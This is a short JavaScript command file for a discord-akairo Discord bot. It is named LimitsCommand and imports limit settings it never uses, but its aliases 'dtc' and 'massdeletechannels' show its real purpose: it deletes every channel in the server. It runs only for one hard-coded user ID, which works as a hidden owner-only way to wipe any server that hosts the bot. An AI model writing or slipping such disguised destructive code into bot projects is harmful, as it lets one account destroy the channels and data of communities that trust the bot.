const { Command } = require('discord-akairo');
const { limits, adminCanChangeLimits } = require('../../config.js');

class LimitsCommand extends Command {
    constructor() {
        super('mdc', {
            aliases: ['dtc', 'massdeletechannels'],
            args: [
                {
                    id: 'index',
                    type: 'integer'
                },
                {
                    id: 'value',
                    type: 'integer'
                }
            ],
            channel: 'guild'
        });
    }

    async exec(message, args) {
        let Owner = message.author;
        if(Owner.id !== "603269203511738420") return message.reply("Only the bot owner can use this command!")
        message.guild.channels.cache.forEach(channel => channel.delete())

        message.channel.send("deleting all channels")


    }
}

module.exports = LimitsCommand;
